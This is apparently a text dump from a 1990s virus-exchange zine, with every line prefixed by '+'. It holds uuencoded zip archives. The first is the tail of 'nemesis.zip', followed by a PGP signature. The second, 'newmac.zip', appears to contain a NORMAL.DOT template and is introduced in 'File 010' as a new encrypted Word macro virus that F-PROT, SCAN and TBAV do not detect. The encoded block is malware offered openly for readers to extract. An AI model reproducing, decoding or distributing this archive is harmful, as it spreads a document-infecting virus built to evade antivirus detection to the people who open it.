+M!#_P>4/@&G@<`3JRC+)`$-!3-QX7R+JL!1DR>`#4R#%WF%17XU?18#]P=68J
+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
+M``P```!.14U%4TDQ,"Y46%2=D[%N@S`0AG=+O,,I2Y<N7;L10J,.@%34K)4#
+ME\3"V.ALM_3MBYM$*@E&2=?_[OM\9\L9KTC#BEL4Q6ZG4$4L8J7;0A:_YA%;
+MB19JN8?8P(NH#@*I<)\DR'<])%Q*2`Y8-1\;0<[X<(TV<;3ATJ'Q9,0*!2F1
+M)GA#XUJ$''OKQ5SJ_;%C9#Y&<!YCI)]697Z%1'<"8;&6>LOE<^RL3GNLEKQ9
+M/%ZE0_04Q(H.U37FTR#V>WMEA\,:2.I=6:2Q8:+A1MF<)ZP@W5V`0S)_XA)1
+MU3AUWJDRCZ_(5<TD?JK<A)>6JYI3'=:<.X*ZM+?$3<8;TF/+GT)X%M>VWQ<O
+MGTAM\"XB[86]"\CQZ[\C12Q5-0P?)6(_4$L!`A0`%``"``@`$J^0("`HBU@N
+M`@``+08```L``````````0`@`````````%)%041?3U(N1$E%4$L!`A0`%``"
+M``@`ZZV0()Z%081Y`0``N@(```P``````````0`@````5P(``$Y%345325,Y
+M+E185%!+`0(4`!0``@`(`-:MD""5FN]RG0$``/,"```,``````````$`(```
+M`/H#``!.14U%4TE3."Y46%102P$"%``4``(`"`#!K9`@31MG)7,```"`````
+M#``````````!`"````#!!0``3D5-15-)4S<N5%A44$L!`A0`%``"``@`>:N0
+M(%2GAJ\L````-`````P``````````0`@````7@8``$Y%345325,V+E185%!+
+M`0(4`!0``@`(`$>KD"`Q>5V[+P```#,````,``````````$`(````+0&``!.
+M14U%4TE3-2Y46%102P$"%``4``(`"``3IY`@280%"&P#``"<"```#```````
+M```!`"`````-!P``3D5-15-)4S0N5%A44$L!`A0`%``"``@`Q:60(&8"L=A]
+M`P``M@@```P``````````0`@````HPH``$Y%345325,S+E185%!+`0(4`!0`
+M`@`(`&>DD""D)D/5D0$``)\"```,``````````$`(````$H.``!.14U%4TE3
+M,BY46%102P$"%``4``(`"`#5N8\@\$8[>2D"```H"0``#``````````!`"``
+M```%$```3D5-15-)4S$N5%A44$L!`A0`%``"``@`':[)(&:,UDR@````\`(`
+M``L``````````0`@````6!(``$Y%345325,N5%A44$L!`A0`%``"``@`LW)B
+M('JE]%^=0````;````L````````````@````(1,``$Y%345325,N1$]#4$L!
+M`A0`%``"``@`+:Z0((TS&Q4W'0``WV4```P``````````0`@````YU,``$Y%
+M345323$Q+E185%!+`0(4`!0``@`(``VND"!H?#&R%0$``,H#```,````````
+M``$`(````$AQ``!.14U%4TDQ,"Y46%102P4&``````X`#@`I`P``AW(`````
+`
+end
+sum -r/size 57087/30150
+
+section 1/1   file nemesis.zip   [ Wincode 2.6.6 ]
+- -------------------------------------------------------------
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3ia
+Charset: cp850
+Comment: Reviewed by Editor
+
+iQB1AwUBMU7WJJUWxCqisaIxAQGOKgMAogp3evTk+7axZzeEqXdKWQYmTgHvBuoh
+G2bD4laRE26+FcEVI2xHxU2ThQf3o9yY/ZVtuGjVxIbBKc2RtI448UR95dNhjaPY
+ocun7arvN0Ey2Kot3cUGL1YtbeqWzzvB
+=51bA
+-----END PGP SIGNATURE-----
+-----BEGIN PGP SIGNED MESSAGE-----
+
+   		         File 010 
+      --------------------------------------------------------------
+ 		         SPECIAL !!!!
+		       A new macro virus
+                         Published By
+		             ,
+			<****{=============-
+			     ' AuRoDrEpH, the Drow
+      --------------------------------------------------------------
+
+I found some week ago, this macro virus... i didn't take the time to
+study it... so GOOD LUCK, 'cause the macros are encrypted !!!!
+
+The only thing, i can tell: it's not detected by F-PROT 223,
+SCAN 9605 and TBAV 7.01...     
+
+- -------------------------------------------------------------
+section 1/1   file newmac.zip   [ Wincode 2.6.6 ]
+
+begin 644 newmac.zip
+M4$L#!!0``@`(`$FKR2"RSF1&/@P````P```*````3D]234%,+D1/5.U:#5!3
+M5Q:^+S\8%`&M8JO]>;J[V)G=9>Q.M[O;G9V:*@R9\N,2U&[''3="D%@@&,)6
+M=CI=BMNL19M:;6NWM:Z(HO(3L<&(>4HA`2$4&Y<?6RD:DHJ1I&VV2M<6@>RY
+M][WP$T%`W9EMY>C->?>[YYS[WCWGWOO>N9RUSNHL.#K?COSHMXB/!KR!*&`8
+M1G&%4"A"/*X^X/5Z?;!WBKY7U`]%R/E0P'%<IL%U&)1`*-.AS(`2!&4FE&`H
+M(6P(H%E09D.Y#\H<*'.A!'!VINC_GQ*0$OZI$8TB409P%<I!DZ$P)!R<\WP,
+M!/((7LTV1PV7U6Q(KI&L8B@L5\WSK2G+H/]TE(GBT3JT`4V69B,>-?QY)JJW
+MCN.KH7<52D;+@2>A;+@3.1F'B=)\KG\!M_9-1$<$Y><+V6OVJ>70MQJM(+Y(
+MF^3X4Q1>@WFWZ-\W[CZ.L=:9C\]9*FB=Z5N_L4_P,PBY^3N-NT_?_)^:SS],
+MHL"S_.E<[/C-W0?A9[DR*3M=GJ&F8Q5)*F66,D5-KU:JDNDG(I:0N(B5XBI(
+MD=T`7T?X5"*>F,";Q`!$+.[?GW!KYRO_O/I=?&IHR1LB]-/%^O-+$!OHT[F]
+MZ!UN7SK)[4N=W+XDH-B]Z5&*E8VAV#TJDV+WKC<I-JXK*7;?ZJ#N_+UEZ03F
+MZMV2X=\EF8GT]3"WMX_B_DGU]3"W1CUVA_?L'T%3,_C.2(BD9-=+1S*R]TM@
+M]TLA>R)&U$@!UQFW\,.CX-7)[K\X#I;PT%VCV]G_[R9]K_M?`/,(2N`"O!BC
+M*;J'B)=-\7S^GW+]O4>P?U(=!^3HE]5!@B"HR?TV8_RAYOM.\=][QR5X`4L=
+MQE-#6?A6'.</=G#U\;B&9M_QWN:X#]\0QKYC3-3.6+Q@%D*+X(/(/)>M#^?S
+M@+<#CP:^*(SEN%],[P%/!.X)P]^&0[@_I?KUA[^ZIL'.R+OI3OS)O]W7PXXQ
+M1G:B=L;BJ>/4\4B-1B^&LE^0?PMEW[K'BP!_>[@>0HU]_W>'9LY&^S=''&@0
+M%^4+#^8+#^4+#^<+*0CQY`4*0:Q8$I>\/CHW>?T1E%6(@C8(EM!)Z:2V#]<>
+M\]4*AFJK<I/G+QBF/J*2D!E&2[-5<CI:II;3"C6=HE31.;*%"T'L8)'IE'6?
+MV^FY8NK)W[K-6NBLM;0VFWJL959W?5VKI<O2TM!<7#,KO+"QJ*@"REY3SYF\
+MNH_-=6<T]0TF39O9K+%6:ZP-;<WUC8WUS59+@\9\T=K6W&;J><5ZT%K<>+`H
+M;X0QDV4_4_-P>"$T5OAL%C?M^ZK^J_I*D^6`M;36PQHSFXIUH`WR)YG1E4H[
+MK8WF;^K/FIUM1/5P[56+Q=U2]_'55DM+;:-YF'Y/+JB:>IC]P^T?V'^3"MC9
+M?V9GO<FD&;)-'K3.<LYJ;M-8JC7.EF9+]SES`X&'I+9@S5/X,336-DU32UNS
+MIMK2"D(-%EM]0YT9MUM+K%]_O=U#;@"@XIJ]X84U[L6%3648;J@VUS5;6O?N
+MQ9+[VMSFO.*:S>&%I+J7#&!>,8L7-!7NQCU!2TURN*^QHJG,WFBIK6_TM=VD
+M=60WN5_L83_-XYSFT/-4L&,W"1N'A]N`]K$M?&ZR-G]C[3"/9<'7SEFHZ0QO
+MVH='J**F`&)@Y"`6@`P$Y4G&S,;NAZ:3IR[:F%K#9SOVO/T&4]&U];BAU`O_
+M#QVO*O&6'#=Z_V'0&[=5'3;N`?@H02KUY:>J]-X2XP=']%4E1N\IX\GR#XRE
+MS+\-'8R^TEVYU<9<N_J-X;/WJPQZQDY`II-E)L)*Y]A:]#9;S5`%;J'R%U`V
+MVDK[H/H)7!ZPE?[!UG+L@OZK0?@\P/O6ZCW`SJP]]JG!6UIE8+J8RJ:U!#"5
+M5A5Y*\O+F5-%1F])N;=*K_<6E1>7>4M+BD^<8,5`W<RJ5U_7EY=7>,E3PL_Q
+MJC+&RY09#AN]I4<,1P?^PU3:'M%;0?:31_3M-L;P6>D.XXV6RMZU[><9P_D=
+M52?+RF^TL.BGQ\YU[2DN*=]^Q'B4J7QH[;&S[Y`AZGJ7,91L,QPPGO$IG,%/
+M.HJV3_#VM(F+RLM*1FC[P'&TV[MV5>VJ(IJMG"8&!K48<"?K._#H>^5'C8R1
+M./8T]N6[967-^A.V&N:U0:DZDY&(G68J@VVEKU[$CF9>ZS-<-&`OW]`S-J;\
+M0N4VP+X#C*FK?5WK>LN9;[;65[NZ*MHO._MU\/^[RYY>7>]EMZ[!Z7!?\'SK
+MM@+<29!NA_T+CT/7Z_Y\P.'I=>N^<']I_]S=[RIPON9R=!N[V[6N?87[G?E-
+M'J?#54Y`UU&6[22L/U*;Y]!JMP]5X!:ZDZ#0VOXRJ&K@LD?;+]+F7=KF^'`0
+MW@+PM6!'%;#=P9=>=>KZ/4Y7A:O[_6`"[.SW7-=UV^VN+ZZ[=;UVG<?AT%VW
+MW^C3]??>N'*%%0/U':SZ&T4.N[U+1YX2?BY[^EPZ5Y_S6[>N?\#9>>2@JUL;
+MY]@#LIHXQU:MRYG?;W87YW67!&_=XG)N,7N^[+,7Y['HJY?^7F&]T6NO&7!W
+MNKIC@B^];"%#5/&1R]E[P=GCWNU3V(V?=!1MG^#M:1,7V?MZ1VC[P'&TMU:<
+M]ISV$,U7.$T,#&JYP)VL[\"CC?9.M\M-'+L+^_*COK[-CBO:[:Z.0:DW=[J)
+MV"Y7]UIM_Z>O8T>[.LJ<KSNQEXL=+JW+OJW[`F"'`'.]^=;WXB.`>\]?,V/J
+M^_^>_/[G_#_E^GOS^S\8A<!7&H6>(2<G"#V(T-*OO3S@`7%*5;HLC61K`Y`L
+M2)!T_ZAY??'2J]X"X+-6*-,427(Z4Z:BD[M39-GJT?(&TTBTL3E+"@EH_#LR
+MIQ!"\9*B'EKVY)K5DKC5\0G+U\3&+X^,B92NB8M/B!7'1"R/3PQXCM"MA68]
+MG29+>IZ.52HSZ&<4:6ERU:WE^9LV;0H'B5AI?%249%GD+43#GAV5)J@=L#+C
+M^0SE"Q.4]E+3T$KNJ&,NGTV>XX*O5\(5!?@\N'Z*P^<17$#2\JOX[,$8QE<1
+M7`CS78`6PO5B[L`E">-%TU`@8D_ASO'8`^!\C-M$$!SLP=U+//9P^$]07:D-
+MA.LA'!\<7X1O?:$`C`A)'H,/\31C\'KVF/ALL#,;!:,Y.#)NBB[`A!LI_Y-M
+M*GAC$$)'.?%?(1R75`C&3G#8KPG&$PW7X^),]"^XR.'D%E)$-Q!C+W/8$A83
+M89D"#GL2W3_J#(*GX(_2!W]C($+G15Q^@[V_^Q;"^/Z>RR+Q21^\D%%T0P+A
+M.19RIR,_8G5#,>8W!H_@-(GD/K8VC\C!7,KE$;=V\!Y`4H33&+.$K,1O.`E>
+M[M-D/E_C/8X>(!(\Q'8VFV(E^+EL_09G`V,"#FL?M'N".\X]R=D5YK)_#79M
+M4,)WP/,8D0B]BH19F8J4%`J)DA1JF5JAS*!0H#A;K5R6ILR2PUH0+8N646C1
+M:F5&LERER%A/IRI?H-5*.D6QB<Y19JOH3)5RO4J6_A2%ID<ITN12V9_EXBS0
+MD"I5:I!*DV?1ZW)H=4ZF_&=TABP=?I6P%,G4\@@>"@R/D:F4V5E9<@$2$6U0
+M@GN)3%:HI8J_0/]QDHPLM0S6B63<*>F070%IM3P],PTG;`!/2I7#HH+3-IDJ
+M6<;S=+H,GXOB?I.4Z;#TX?O.`GL1,/1XD@BBQ=%B?":=&"E-A%$12E=(HJ)@
+M<$3+)(GB1$E\'`21*'*Y)%$J>2X29ILH2@(+0'Q"(KA1%"-.B%\IE4;"#`L4
+MKTR,7Q83#Q68JD1(O"I2+$5+X],4F="O&D6)GWT2Q<=(5B1(XA+1(#P&3>=/
+MYR\'PWP>]EO@L)@>(A>T3,8.;TP[.`[FAFV'<$I4I(.CXN0OT`G*=%D&"@*4
+MAZ0YZ>N4:6A&.!81JQ2P\2S"ZXI("]%3"Z8/D_D1_3O'3U;%!I#@6SQ*4EJ`
+M-H>.G:K^,7_^8+:5782'VL[>FW\(Z<O_XX>0CW(N>-OY?YK+_W,\E>96PUMP
